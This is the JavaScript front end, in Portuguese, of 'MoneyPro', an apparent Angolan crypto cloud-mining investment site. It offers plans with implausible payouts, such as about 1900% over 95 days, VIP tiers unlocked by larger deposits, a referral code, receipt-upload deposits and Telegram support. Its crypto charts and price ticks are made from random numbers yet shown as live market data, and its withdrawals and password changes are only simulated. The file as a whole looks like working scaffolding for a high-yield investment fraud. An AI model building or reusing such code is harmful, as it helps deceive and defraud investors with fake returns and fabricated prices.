/* ===== MONEYPRO - JavaScript Principal ===== */

// ===== TAB NAVIGATION =====
function switchTab(tabId) {
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
  document.getElementById(tabId).classList.add('active');
  
  const navItem = document.querySelector(`[data-tab="${tabId}"]`);
  if (navItem) navItem.classList.add('active');
  
  if (tabId === 'tab-mercado') {
    setTimeout(() => drawMarketCharts(), 100);
  }
  if (tabId === 'tab-grafico') {
    setTimeout(() => drawFullChart(), 100);
  }
}

// ===== INVESTMENT DATA =====
const investments = {
  diario: [
    { id: 101, name: 'ETH VIP1', icon: 'Ξ', price: 5000, return: 2500, duration: '1 Dia', vip: 1, totalReturn: 7500 },
    { id: 102, name: 'ETH VIP2', icon: 'Ξ', price: 6000, return: 1500, duration: '1 Dia', vip: 1, totalReturn: 15000 },
    { id: 103, name: 'ETH VIP3', icon: 'Ξ', price: 15000, return: 37500, duration: '1 Dia', vip: 1, totalReturn: 37500 },
    { id: 104, name: 'ETH VIP4', icon: 'Ξ', price: 50000, return: 91000, duration: '1 Dia', vip: 1, totalReturn: 91000 },
    { id: 105, name: 'ETH VIP5', icon: 'Ξ', price: 100000, return: 160000, duration: '1 Dia', vip: 1, totalReturn: 160000 },
    { id: 106, name: 'ETH VIP6', icon: 'Ξ', price: 200000, return: 360000, duration: '1 Dia', vip: 1, totalReturn: 360000 },
    { id: 107, name: 'ETH VIP7', icon: 'Ξ', price: 500000, return: 940000, duration: '1 Dia', vip: 1, totalReturn: 940000 },
    { id: 108, name: 'ETH VIP8', icon: 'Ξ', price: 3000000, return: 3000000, duration: '1 Dia', vip: 1, totalReturn: 3000000 },
  ],
  semanal: [
    { id: 201, name: 'Máquina 1', icon: '⛏️', price: 8500, return: 4760, duration: '7 Dias', vip: 1, totalReturn: 33320 },
    { id: 202, name: 'Máquina 2', icon: '⛏️', price: 17500, return: 10150, duration: '7 Dias', vip: 1, totalReturn: 71050 },
    { id: 203, name: 'Máquina 3', icon: '⛏️', price: 55000, return: 33000, duration: '7 Dias', vip: 1, totalReturn: 231000 },
    { id: 204, name: 'Máquina 4', icon: '⛏️', price: 135000, return: 83700, duration: '7 Dias', vip: 1, totalReturn: 585900 },
    { id: 205, name: 'Máquina 5', icon: '⛏️', price: 350000, return: 224000, duration: '7 Dias', vip: 1, totalReturn: 1568000 },
    { id: 206, name: 'Máquina 6', icon: '⛏️', price: 700000, return: 462000, duration: '7 Dias', vip: 1, totalReturn: 3234000 },
  ],
  mensal: [
    { id: 301, name: 'Produto 1', icon: '📦', price: 5000, return: 1000, duration: '95 Dias', vip: 0, totalReturn: 95000 },
    { id: 302, name: 'Produto 2', icon: '📦', price: 8000, return: 1680, duration: '95 Dias', vip: 0, totalReturn: 159600 },
    { id: 303, name: 'Produto 3', icon: '📦', price: 22500, return: 4950, duration: '95 Dias', vip: 0, totalReturn: 470250 },
    { id: 304, name: 'Produto 4', icon: '📦', price: 50000, return: 11500, duration: '95 Dias', vip: 0, totalReturn: 1092500 },
    { id: 305, name: 'Produto 5', icon: '📦', price: 165000, return: 39600, duration: '95 Dias', vip: 0, totalReturn: 3762000 },
    { id: 306, name: 'Produto 6', icon: '📦', price: 300000, return: 75000, duration: '95 Dias', vip: 0, totalReturn: 7125000 },
    { id: 307, name: 'Produto 7', icon: '📦', price: 650000, return: 169000, duration: '95 Dias', vip: 0, totalReturn: 16055000 },
    { id: 308, name: 'Produto 8', icon: '📦', price: 980000, return: 264600, duration: '95 Dias', vip: 0, totalReturn: 25370000 },
    { id: 309, name: 'Desbloqueio VIP 1', icon: '🔓', price: 95, return: 0, duration: '1 Dia', vip: 0, totalReturn: 0 }
  ]
};

// ===== MARKET DATA =====
const marketData = [
  { name: 'Bitcoin', symbol: 'BTC', price: 67432.50, change: 2.34, icon: 'btc' },
  { name: 'Ethereum', symbol: 'ETH', price: 3521.80, change: 1.87, icon: 'eth' },
  { name: 'BNB', symbol: 'BNB', price: 612.45, change: -0.56, icon: 'bnb' },
  { name: 'Solana', symbol: 'SOL', price: 178.92, change: 4.21, icon: 'sol' },
  { name: 'Cardano', symbol: 'ADA', price: 0.4523, change: -1.12, icon: 'ada' },
  { name: 'XRP', symbol: 'XRP', price: 0.6234, change: 0.89, icon: 'xrp' },
];

let currentInvestmentPage = 'diario';
let userLevel = 0;
let userBalance = 5000.00;
let userInvested = 0;

const vipLevels = [
  { level: 0, requirement: 0, color: '#9CA3AF' },
  { level: 1, requirement: 5000, color: '#3B82F6' },
  { level: 2, requirement: 80000, color: '#22C5E9' },
  { level: 3, requirement: 300000, color: '#F59E0B' },
  { level: 4, requirement: 1000000, color: '#A855F7' },
  { level: 5, requirement: 3000000, color: '#10B981' },
  { level: 6, requirement: 7000000, color: '#EF4444' },
  { level: 7, requirement: 13000000, color: '#EC4899' },
  { level: 8, requirement: 20000000, color: '#059669' }
];

function checkVipUpgrade() {
  let newLevel = 0;
  for (let i = vipLevels.length - 1; i >= 0; i--) {
    if (userInvested >= vipLevels[i].requirement) {
      newLevel = vipLevels[i].level;
      break;
    }
  }
  
  if (newLevel !== userLevel) {
    userLevel = newLevel;
    // Atualizar no storage
    const currentUser = JSON.parse(sessionStorage.getItem('moneypro_current_user'));
    if (currentUser) {
      currentUser.vip = userLevel;
      sessionStorage.setItem('moneypro_current_user', JSON.stringify(currentUser));
      
      // Também atualizar na "base de dados" local
      const users = JSON.parse(localStorage.getItem('moneypro_users'));
      const userIdx = users.findIndex(u => u.id === currentUser.id);
      if (userIdx !== -1) {
        users[userIdx].vip = userLevel;
        localStorage.setItem('moneypro_users', JSON.stringify(users));
      }
    }
  }
  updateVipUI();
}

function updateVipUI() {
  const nextVip = vipLevels.find(v => v.level === userLevel + 1) || vipLevels[vipLevels.length - 1];
  const currentVip = vipLevels.find(v => v.level === userLevel);
  
  const progressText = document.getElementById('vipProgressText');
  if (progressText) {
    progressText.innerHTML = `Investimento necessário <strong>${userInvested.toLocaleString()}</strong> / ${nextVip.requirement.toLocaleString()}`;
  }
  
  const progressBar = document.getElementById('vipProgressBar');
  if (progressBar) {
    const range = nextVip.requirement - currentVip.requirement;
    const progress = range > 0 ? ((userInvested - currentVip.requirement) / range) * 100 : 100;
    progressBar.style.width = `${Math.min(100, Math.max(0, progress))}%`;
    progressBar.style.background = `linear-gradient(90deg, ${currentVip.color}, ${nextVip.color})`;
  }
  
  const currentVipBadge = document.getElementById('currentVipBadge');
  if (currentVipBadge) {
    currentVipBadge.textContent = userLevel;
    currentVipBadge.style.background = currentVip.color;
  }
  
  const nextVipBadge = document.getElementById('nextVipBadge');
  if (nextVipBadge) {
    nextVipBadge.textContent = nextVip.level;
    nextVipBadge.style.background = nextVip.level === userLevel ? currentVip.color : 'rgba(255,255,255,0.1)';
    nextVipBadge.style.color = nextVip.level === userLevel ? '#fff' : 'rgba(255,255,255,0.5)';
  }

  document.querySelectorAll('.profile-vip-badge').forEach(el => el.textContent = `VIP ${userLevel}`);
}

// ===== GENERATE CHART DATA =====
function generateChartData(points, trend, volatility) {
  const data = [];
  let value = 100 + Math.random() * 50;
  for (let i = 0; i < points; i++) {
    const change = (Math.random() - 0.48) * volatility + trend * 0.01;
    value += change;
    value = Math.max(50, value);
    data.push(value);
  }
  return data;
}

// ===== DRAW MINI CHART =====
function drawMiniChart(canvas, data, color = '#00C896') {
  const ctx = canvas.getContext('2d');
  const rect = canvas.parentElement.getBoundingClientRect();
  canvas.width = rect.width;
  canvas.height = rect.height;
  const w = canvas.width;
  const h = canvas.height;
  
  const min = Math.min(...data);
  const max = Math.max(...data);
  const range = max - min || 1;
  
  ctx.clearRect(0, 0, w, h);
  
  const gradient = ctx.createLinearGradient(0, 0, 0, h);
  gradient.addColorStop(0, color + '30');
  gradient.addColorStop(1, color + '00');
  
  ctx.beginPath();
  ctx.moveTo(0, h);
  
  data.forEach((val, i) => {
    const x = (i / (data.length - 1)) * w;
    const y = h - ((val - min) / range) * h * 0.8 - h * 0.1;
    if (i === 0) ctx.lineTo(x, y);
    else ctx.lineTo(x, y);
  });
  
  ctx.lineTo(w, h);
  ctx.closePath();
  ctx.fillStyle = gradient;
  ctx.fill();
  
  ctx.beginPath();
  data.forEach((val, i) => {
    const x = (i / (data.length - 1)) * w;
    const y = h - ((val - min) / range) * h * 0.8 - h * 0.1;
    if (i === 0) ctx.moveTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.strokeStyle = color;
  ctx.lineWidth = 2;
  ctx.stroke();
}

// ===== DRAW FULL CHART =====
function drawFullChart() {
  const canvas = document.getElementById('fullChart');
  if (!canvas) return;
  
  const ctx = canvas.getContext('2d');
  const rect = canvas.parentElement.getBoundingClientRect();
  canvas.width = rect.width;
  canvas.height = rect.height;
  const w = canvas.width;
  const h = canvas.height;
  
  const data = generateChartData(48, 0.3, 3);
  const min = Math.min(...data);
  const max = Math.max(...data);
  const range = max - min || 1;
  
  ctx.clearRect(0, 0, w, h);
  
  ctx.strokeStyle = '#1F2937';
  ctx.lineWidth = 0.5;
  for (let i = 0; i <= 5; i++) {
    const y = (h / 5) * i;
    ctx.beginPath();
    ctx.moveTo(0, y);
    ctx.lineTo(w, y);
    ctx.stroke();
  }
  
  const barWidth = (w / data.length) * 0.6;
  for (let i = 0; i < data.length; i++) {
    const x = (i / (data.length - 1)) * w;
    const volume = Math.random() * 40 + 10;
    const barHeight = (volume / 50) * h * 0.25;
    const isUp = i > 0 ? data[i] > data[i-1] : true;
    ctx.fillStyle = isUp ? 'rgba(0, 200, 150, 0.15)' : 'rgba(239, 68, 68, 0.15)';
    ctx.fillRect(x - barWidth/2, h - barHeight, barWidth, barHeight);
  }
  
  const gradient = ctx.createLinearGradient(0, 0, 0, h);
  gradient.addColorStop(0, '#00C89640');
  gradient.addColorStop(1, '#00C89600');
  
  ctx.beginPath();
  ctx.moveTo(0, h);
  data.forEach((val, i) => {
    const x = (i / (data.length - 1)) * w;
    const y = h - ((val - min) / range) * h * 0.7 - h * 0.1;
    ctx.lineTo(x, y);
  });
  ctx.lineTo(w, h);
  ctx.closePath();
  ctx.fillStyle = gradient;
  ctx.fill();
  
  ctx.beginPath();
  data.forEach((val, i) => {
    const x = (i / (data.length - 1)) * w;
    const y = h - ((val - min) / range) * h * 0.7 - h * 0.1;
    if (i === 0) ctx.moveTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.strokeStyle = '#00C896';
  ctx.lineWidth = 2.5;
  ctx.stroke();
  
  ctx.fillStyle = '#9CA3AF';
  ctx.font = '10px Inter';
  ctx.textAlign = 'right';
  for (let i = 0; i <= 4; i++) {
    const val = max - (range / 4) * i;
    const y = ((val - min) / range) * h * 0.7 + h * 0.1;
    ctx.fillText(val.toFixed(2), w - 5, y);
  }
}

// ===== DRAW MARKET CHARTS =====
function drawMarketCharts() {
  marketData.forEach((coin, index) => {
    const canvas = document.getElementById(`chart-${coin.symbol}`);
    if (!canvas) return;
    
    const trend = coin.change > 0 ? 0.2 : -0.2;
    const color = coin.change > 0 ? '#00C896' : '#EF4444';
    const data = generateChartData(24, trend, 2);
    drawMiniChart(canvas, data, color);
  });
}

// ===== DRAW DAILY CHART =====
function drawDailyChart() {
  const canvas = document.getElementById('dailyChart');
  if (!canvas) return;
  
  const data = generateChartData(30, 0.5, 4);
  const rect = canvas.parentElement.getBoundingClientRect();
  canvas.width = rect.width;
  canvas.height = rect.height;
  
  drawMiniChart(canvas, data, '#00C896');
}

// ===== RENDER INVESTMENT CARDS =====
function renderInvestments() {
  const container = document.getElementById('investments-grid');
  const title = document.getElementById('pageTitle');
  if (!container) return;
  
  const titles = {
    diario: 'Planos de Rendimento Diário',
    semanal: 'Máquinas de Mineração Semanal',
    mensal: 'Fundo de Investimento Mensal'
  };
  
  title.textContent = titles[currentInvestmentPage];
  
  const items = investments[currentInvestmentPage] || investments.diario;
  container.innerHTML = items.map(item => `
    <div class="invest-card" onclick="openInvestmentModal(${item.id})">
      <div class="invest-card-img" style="display: flex; align-items: center; justify-content: center; font-size: 32px; background: var(--bg-sidebar);">
        ${item.icon}
        <div class="invest-card-badge">VIP ${item.vip}</div>
      </div>
      <div class="invest-card-title">${item.name}</div>
      <div class="invest-card-price">AOA ${item.price.toLocaleString()}</div>
      <div class="invest-card-return">
        <span>+AOA ${item.return.toLocaleString()}/${currentInvestmentPage === 'diario' ? 'dia' : 'período'}</span>
        <span>${item.duration}</span>
      </div>
    </div>
  `).join('');
}

// ===== SWITCH INVESTMENT PAGE =====
function switchInvestmentPage(page) {
  currentInvestmentPage = page;
  document.querySelectorAll('.page-tab').forEach(t => t.classList.remove('active'));
  document.querySelector(`[data-page="${page}"]`).classList.add('active');
  renderInvestments();
}

// ===== OPEN INVESTMENT MODAL =====
function openInvestmentModal(id) {
  const allItems = [...investments.diario, ...investments.semanal, ...investments.mensal];
  const item = allItems.find(i => i.id === id);
  if (!item) return;
  
  // Verificar se o utilizador tem saldo suficiente
  const hasBalance = userBalance >= item.price;
  
  // VIP 1 requer ter comprado o plano de 95 dias (Fundo Mensal)
  const isVip1Unlocked = userLevel >= 1;
  const needsVip1 = item.vip >= 1; // Planos com VIP >= 1 precisam de VIP 1 desbloqueado
  const locked = (needsVip1 && !isVip1Unlocked) || item.vip > userLevel;
  
  document.getElementById('modalTitle').textContent = item.name;
  
  let subtitleText = '';
  if (!hasBalance) {
    subtitleText = `Saldo insuficiente. Precisa de AOA ${(item.price - userBalance).toLocaleString()}`;
  } else if (locked) {
    subtitleText = `Requer nível VIP ${item.vip} para investir`;
  } else {
    subtitleText = `Investimento disponível - ${item.duration}`;
  }
  
  document.getElementById('modalSubtitle').textContent = subtitleText;
  
  document.getElementById('modalPrice').textContent = `AOA ${item.price.toLocaleString()}`;
  document.getElementById('modalDailyReturn').textContent = `AOA ${item.return.toLocaleString()}`;
  document.getElementById('modalTotalReturn').textContent = `AOA ${item.totalReturn.toLocaleString()}`;
  document.getElementById('modalDuration').textContent = item.duration;
  
  const investBtn = document.getElementById('investBtn');
  if (locked || !hasBalance) {
    investBtn.textContent = locked ? 'Nível VIP Insuficiente' : 'Saldo Insuficiente';
    investBtn.disabled = true;
    investBtn.style.opacity = '0.5';
    investBtn.onclick = null;
  } else {
    investBtn.textContent = 'Investir Agora';
    investBtn.disabled = false;
    investBtn.style.opacity = '1';
    investBtn.onclick = function() { completeInvestment(id); };
  }
  
  document.getElementById('investModal').classList.add('active');
}

// ===== COMPLETE INVESTMENT =====
function completeInvestment(id) {
  const allItems = [...investments.diario, ...investments.semanal, ...investments.mensal];
  const item = allItems.find(i => i.id === id);
  if (!item || userBalance < item.price) return;
  
  // Descontar do saldo
  userBalance -= item.price;
  userInvested += item.price;
  
  // Verificar upgrade de VIP
  checkVipUpgrade();
  
  // Atualizar UI
  const formattedBalance = userBalance.toLocaleString(undefined, {minimumFractionDigits: 2});
  document.querySelectorAll('.balance-amount').forEach(el => el.textContent = `AOA ${formattedBalance}`);
  document.querySelectorAll('.wallet-amount').forEach(el => el.textContent = `AOA ${formattedBalance}`);
  
  // Guardar dados
  const currentUser = JSON.parse(sessionStorage.getItem('moneypro_current_user'));
  if (currentUser) {
    currentUser.balance = userBalance;
    currentUser.invested = userInvested;
    currentUser.vip = userLevel;
    sessionStorage.setItem('moneypro_current_user', JSON.stringify(currentUser));
    
    // Também atualizar na "base de dados" local
    const users = JSON.parse(localStorage.getItem('moneypro_users'));
    const userIdx = users.findIndex(u => u.id === currentUser.id);
    if (userIdx !== -1) {
      users[userIdx].balance = userBalance;
      users[userIdx].invested = userInvested;
      users[userIdx].vip = userLevel;
      localStorage.setItem('moneypro_users', JSON.stringify(users));
    }
  }
  
  showToast(`Investimento de AOA ${item.price.toLocaleString()} realizado com sucesso!`);
  closeModal();
}

// ===== CLOSE MODAL =====
function closeModal() {
  document.getElementById('investModal').classList.remove('active');
}

function closeInfoModal() {
  document.getElementById('infoModal').classList.remove('active');
}

// ===== PROFILE OPTIONS LOGIC =====
function openProfileOption(option) {
  const titleEl = document.getElementById('infoModalTitle');
  const bodyEl = document.getElementById('infoModalBody');
  
  titleEl.textContent = option;
  
  switch(option) {
    case 'Meus Pedidos':
      bodyEl.innerHTML = `
        <div style="text-align: center; padding: 20px 0;">
          <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 16px; opacity: 0.5;"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
          <p>Ainda não realizou nenhum pedido.</p>
        </div>
      `;
      break;
    case 'Registo da Carteira':
      bodyEl.innerHTML = `
        <div style="text-align: center; padding: 20px 0;">
          <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 16px; opacity: 0.5;"><rect x="1" y="4" width="22" height="16" rx="2" ry="2"></rect><line x1="1" y1="10" x2="23" y2="10"></line></svg>
          <p>Não existem registos de transações na sua carteira.</p>
        </div>
      `;
      break;
    case 'Senha de Login':
      bodyEl.innerHTML = `
        <div style="padding: 10px 0;">
          <p style="margin-bottom: 16px;">Altere a sua senha de acesso à conta.</p>
          <input type="password" placeholder="Senha Atual" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-sidebar); color: #fff; margin-bottom: 12px;">
          <input type="password" placeholder="Nova Senha" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-sidebar); color: #fff; margin-bottom: 12px;">
          <input type="password" placeholder="Confirmar Nova Senha" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-sidebar); color: #fff; margin-bottom: 20px;">
          <button class="modal-btn" onclick="showToast('Senha de login alterada com sucesso!'); closeInfoModal();">Alterar Senha</button>
        </div>
      `;
      break;
    case 'Senha de Retirada':
      bodyEl.innerHTML = `
        <div style="padding: 10px 0;">
          <p style="margin-bottom: 16px;">Configure a sua senha de segurança para retiradas.</p>
          <input type="password" placeholder="Nova Senha (6 dígitos)" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-sidebar); color: #fff; margin-bottom: 12px;">
          <input type="password" placeholder="Confirmar Senha" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-sidebar); color: #fff; margin-bottom: 20px;">
          <button class="modal-btn" onclick="showToast('Senha de retirada configurada com sucesso!'); closeInfoModal();">Salvar Senha</button>
        </div>
      `;
      break;
    case 'Informações Pessoais':
      bodyEl.innerHTML = `
        <div style="padding: 10px 0;">
          <div style="margin-bottom: 16px;">
            <label style="display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 4px;">Nome de Utilizador</label>
            <input type="text" value="Utilizador MoneyPro" style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: var(--bg-sidebar); color: #fff;">
          </div>
          <div style="margin-bottom: 20px;">
            <label style="display: block; font-size: 12px; color: var(--text-secondary); margin-bottom: 4px;">Número de Telefone</label>
            <input type="text" value="923000000" readonly style="width: 100%; padding: 12px; border-radius: 8px; border: 1px solid var(--border-color); background: rgba(255,255,255,0.05); color: var(--text-secondary);">
          </div>
          <button class="modal-btn" onclick="showToast('Informações atualizadas!'); closeInfoModal();">Salvar Alterações</button>
        </div>
      `;
      break;
    case 'Configurações':
      bodyEl.innerHTML = `
        <div style="display: flex; flex-direction: column; gap: 12px;">
          <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: var(--bg-sidebar); border-radius: 8px;">
            <span>Notificações</span>
            <div style="width: 40px; height: 20px; background: var(--primary); border-radius: 10px; position: relative;">
              <div style="width: 16px; height: 16px; background: #fff; border-radius: 50%; position: absolute; right: 2px; top: 2px;"></div>
            </div>
          </div>
          <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: var(--bg-sidebar); border-radius: 8px;">
            <span>Idioma</span>
            <span>Português</span>
          </div>
          <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px; background: var(--bg-sidebar); border-radius: 8px;">
            <span>Versão da App</span>
            <span>v3.0.1</span>
          </div>
          <button class="modal-btn secondary" style="color: var(--accent-red); border-color: var(--accent-red);" onclick="showToast('Sessão encerrada');">Sair da Conta</button>
        </div>
      `;
      break;
    case 'Suporte Online':
      bodyEl.innerHTML = `
        <div style="text-align: center; padding: 20px 0;">
          <p style="margin-bottom: 20px;">Precisa de ajuda? Fale com um dos nossos consultores oficiais.</p>
          <button class="modal-btn" style="background: #0088cc;" onclick="window.open('https://t.me/moneypro_support', '_blank');">Abrir Chat no Telegram</button>
        </div>
      `;
      break;
    case 'Sobre Nós':
      bodyEl.innerHTML = `
        <div style="text-align: justify;">
          <p style="margin-bottom: 12px;">A <strong>MoneyPro</strong> é uma plataforma líder em gestão de ativos digitais e mineração em nuvem, focada em democratizar o acesso ao mercado de criptomoedas.</p>
          <p style="margin-bottom: 12px;">A nossa missão é fornecer ferramentas de investimento seguras, transparentes e de alto rendimento para utilizadores em todo o mundo, com foco especial no mercado angolano.</p>
          <p>Operamos com transparência e tecnologia de ponta para garantir a melhor experiência financeira para a nossa comunidade.</p>
        </div>
      `;
      break;
  }
  
  document.getElementById('infoModal').classList.add('active');
}

// ===== TOAST =====
function showToast(message) {
  const toast = document.getElementById('toast');
  toast.textContent = message;
  toast.classList.add('show');
  setTimeout(() => toast.classList.remove('show'), 2500);
}

// ===== DEPOSIT / WITHDRAW =====
// ===== DEPOSIT LOGIC =====
const depositAmounts = [5000, 15000, 25000, 40000, 100000, 200000];
let currentDepositAmountIndex = 0;
let uploadedReceipt = null;

function openDeposit() {
  switchTab('tab-deposito');
  updateDepositUI();
}

function updateDepositUI() {
  const amount = depositAmounts[currentDepositAmountIndex];
  const formattedAmount = amount.toLocaleString('pt-PT');
  
  document.getElementById('selectedAmount').textContent = formattedAmount;
  document.getElementById('transferAmount').textContent = formattedAmount;
  
  // Update dots
  const dotsContainer = document.getElementById('carouselDots');
  if (dotsContainer) {
    dotsContainer.innerHTML = depositAmounts.map((_, i) => 
      `<div class="dot ${i === currentDepositAmountIndex ? 'active' : ''}"></div>`
    ).join('');
  }
}

function changeAmount(direction) {
  currentDepositAmountIndex += direction;
  if (currentDepositAmountIndex < 0) currentDepositAmountIndex = depositAmounts.length - 1;
  if (currentDepositAmountIndex >= depositAmounts.length) currentDepositAmountIndex = 0;
  updateDepositUI();
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(() => {
    showToast('Copiado: ' + text);
  }).catch(() => {
    showToast('Erro ao copiar');
  });
}

function handleFileUpload(input) {
  if (input.files && input.files[0]) {
    uploadedReceipt = input.files[0];
    document.getElementById('uploadStatus').textContent = 'Arquivo selecionado: ' + uploadedReceipt.name;
    document.getElementById('uploadStatus').style.color = '#e91e63';
    showToast('Comprovativo anexado');
  }
}

function confirmDeposit() {
  if (!uploadedReceipt) {
    showToast('Por favor, anexe o comprovativo do depósito');
    return;
  }
  
  const amount = depositAmounts[currentDepositAmountIndex];
  showToast('Processando depósito de ' + amount.toLocaleString('pt-PT') + ' Kz...');
  
  // Simular processamento
  setTimeout(() => {
    showToast('Depósito enviado para análise!');
    switchTab('tab-perfil');
    // Reset state
    uploadedReceipt = null;
    document.getElementById('uploadStatus').textContent = 'Toque para selecionar imagem/pdf';
    document.getElementById('uploadStatus').style.color = '#888';
  }, 2000);
}

// ===== WITHDRAW LOGIC =====
let bankAccount = null;

function openWithdraw() {
  switchTab('tab-saque');
  // Update balance display in withdraw tab
  const formattedBalance = userBalance.toLocaleString('pt-PT', {minimumFractionDigits: 2});
  document.querySelectorAll('#tab-saque .balance-amount').forEach(el => el.textContent = formattedBalance);
  
  // Initialize PIN fields
  setupPinFields();
}

function setupPinFields() {
  const fields = document.querySelectorAll('.pin-field');
  fields.forEach((field, index) => {
    field.value = '';
    field.addEventListener('input', (e) => {
      if (e.target.value.length === 1 && index < fields.length - 1) {
        fields[index + 1].focus();
      }
    });
    field.addEventListener('keydown', (e) => {
      if (e.key === 'Backspace' && !e.target.value && index > 0) {
        fields[index - 1].focus();
      }
    });
  });
}

function openBankModal() {
  document.getElementById('bankModal').classList.add('show');
}

function closeBankModal() {
  document.getElementById('bankModal').classList.remove('show');
}

function saveBankAccount() {
  const name = document.getElementById('bankName').value;
  const owner = document.getElementById('bankOwner').value;
  const iban = document.getElementById('bankIban').value;
  
  if (!name || !owner || !iban) {
    showToast('Por favor, preencha todos os campos');
    return;
  }
  
  bankAccount = { name, owner, iban };
  
  // Update UI
  document.getElementById('addAccountBtn').style.display = 'none';
  document.getElementById('bankAccountDisplay').style.display = 'block';
  document.getElementById('activeBankName').textContent = 'BANCO ' + name;
  document.getElementById('activeBankOwner').textContent = owner;
  document.getElementById('activeBankIban').textContent = iban.substring(0, 10) + ' ... ' + iban.substring(iban.length - 4);
  
  closeBankModal();
  showToast('Conta vinculada com sucesso!');
}

function processWithdraw() {
  if (!bankAccount) {
    showToast('Por favor, adicione uma conta de destino');
    return;
  }
  
  const amount = parseFloat(document.getElementById('withdrawAmountInput').value);
  if (isNaN(amount) || amount < 500) {
    showToast('Valor mínimo de saque é 500 Kz');
    return;
  }
  
  if (amount > userBalance) {
    showToast('Saldo insuficiente');
    return;
  }
  
  // Check PIN
  const pinFields = document.querySelectorAll('.pin-field');
  let pin = '';
  pinFields.forEach(f => pin += f.value);
  
  if (pin.length < 6) {
    showToast('Insira a senha de 6 dígitos');
    return;
  }
  
  showToast('Processando levantamento de ' + amount.toLocaleString('pt-PT') + ' Kz...');
  
  // Simular processamento
  setTimeout(() => {
    userBalance -= amount;
    // Update balance everywhere
    const formattedBalance = userBalance.toLocaleString('pt-PT', {minimumFractionDigits: 2});
    document.querySelectorAll('.balance-amount').forEach(el => el.textContent = `AOA ${formattedBalance}`);
    
    showToast('Solicitação de levantamento enviada!');
    switchTab('tab-perfil');
    
    // Reset fields
    document.getElementById('withdrawAmountInput').value = '';
    pinFields.forEach(f => f.value = '');
  }, 2000);
}

// ===== COPY REFERRAL =====
function copyReferral() {
  const code = 'MP-2044-ANG';
  navigator.clipboard.writeText(code).then(() => {
    showToast('Código copiado: ' + code);
  }).catch(() => {
    showToast('Código: ' + code);
  });
}

// ===== TIMEFRAME BUTTONS =====
function switchTimeframe(btn) {
  document.querySelectorAll('.timeframe-btn').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  setTimeout(() => drawFullChart(), 100);
}

// ===== INIT =====
document.addEventListener('DOMContentLoaded', function() {
  // Verificação de Login
  const currentUser = sessionStorage.getItem('moneypro_current_user');
  if (!currentUser && !window.location.href.includes('auth.html') && !window.location.href.includes('admin.html')) {
    window.location.href = 'auth.html';
    return;
  }
  
  const user = JSON.parse(currentUser);
  if (user) {
    userLevel = user.vip;
    userBalance = user.balance;
    userInvested = user.invested;
    
    // Atualizar UI com dados do utilizador
    const formattedBalance = userBalance.toLocaleString(undefined, {minimumFractionDigits: 2});
    document.querySelectorAll('.balance-amount').forEach(el => el.textContent = `AOA ${formattedBalance}`);
    document.querySelectorAll('.wallet-amount').forEach(el => el.textContent = `AOA ${formattedBalance}`);
    
    // Atualizar carteiras específicas no perfil
    const depositWallet = document.querySelector('.profile-wallet-card div[style*="color: var(--success)"]');
    if (depositWallet) depositWallet.textContent = `AOA ${formattedBalance}`;

    const profileNameEl = document.querySelector('.profile-name');
    if (profileNameEl) profileNameEl.textContent = `Utilizador ${user.phone}`;
    
    const profileIdEl = document.querySelector('.profile-id');
    if (profileIdEl) profileIdEl.textContent = `ID: ${user.id}`;
    
    updateVipUI();
  }

  renderInvestments();
  drawDailyChart();
  
  setInterval(() => {
    marketData.forEach(coin => {
      const oldPrice = coin.price;
      const changePercent = (Math.random() - 0.48) * 0.002;
      coin.price += oldPrice * changePercent;
      
      const priceEls = document.querySelectorAll(`[id^="price-${coin.symbol}"]`);
      priceEls.forEach(el => {
        const newPriceText = `AOA ${(coin.price * 920).toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
        
        if (el.textContent !== newPriceText) {
          const animClass = changePercent >= 0 ? 'price-up' : 'price-down';
          el.textContent = newPriceText;
          el.classList.remove('price-up', 'price-down');
          void el.offsetWidth;
          el.classList.add(animClass);
        }
      });
    });
  }, 3000);

  document.querySelectorAll('.market-card').forEach(card => {
    card.addEventListener('click', () => {
      switchTab('tab-grafico');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    });
  });
});
